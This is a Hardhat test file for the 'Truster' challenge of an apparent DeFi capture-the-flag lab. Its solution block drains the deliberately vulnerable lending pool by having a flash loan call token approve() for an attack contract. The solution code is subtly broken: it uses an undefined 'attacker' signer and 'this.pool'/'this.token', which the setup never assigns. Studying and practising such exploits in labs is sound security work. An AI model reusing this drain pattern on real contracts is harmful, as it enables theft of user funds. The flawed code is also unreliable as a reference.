const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
    pool = await (
      await ethers.getContractFactory('TrusterLenderPool', deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const AttackTruster = await ethers.getContractFactory('AttackTruster', attacker);
    const attackTruster = await AttackTruster.deploy(this.pool.address, this.token.address);

    const amount = 0;
    const borrower = attacker.address;
    const target = this.token.address;

    const abi = ['function approve(address spender, uint256 amount)'];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData('approve', [attackTruster.address, TOKENS_IN_POOL]);

    await attackTruster.attack(amount, borrower, target, data);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
